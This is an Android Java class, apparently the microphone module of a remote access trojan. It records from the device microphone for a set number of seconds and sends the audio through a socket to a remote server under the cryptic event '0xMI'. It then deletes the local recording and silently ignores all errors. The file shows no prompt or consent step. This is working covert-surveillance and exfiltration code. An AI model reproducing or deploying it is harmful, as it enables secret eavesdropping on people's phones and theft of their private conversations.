package com.fason.app.features.mic;

import android.media.MediaRecorder;

import com.fason.app.core.FasonApp;
import com.fason.app.core.network.SocketClient;

import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.Timer;
import java.util.TimerTask;

public class MicManager {

    private static MediaRecorder recorder;
    private static File audioFile;

    public static void startRecording(int seconds) {
        if (seconds <= 0) return;
        
        try {
            File cache = FasonApp.getContext().getCacheDir();
            if (cache == null) return;

            audioFile = File.createTempFile("rec", ".mp4", cache);

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    stopAndSend();
                }
            }, seconds * 1000L);

        } catch (Exception ignored) {}
    }

    private static void stopAndSend() {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;

                if (audioFile != null && audioFile.exists()) {
                    send(audioFile);
                    audioFile.delete();
                }
            }
        } catch (Exception ignored) {}
    }

    private static void send(File file) {
        try {
            byte[] data = new byte[(int) file.length()];
            try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file))) {
                bis.read(data);
            }

            JSONObject obj = new JSONObject();
            obj.put("file", true);
            obj.put("name", file.getName());
            obj.put("buffer", data);
            SocketClient.getInstance().getSocket().emit("0xMI", obj);
        } catch (Exception ignored) {}
    }
}
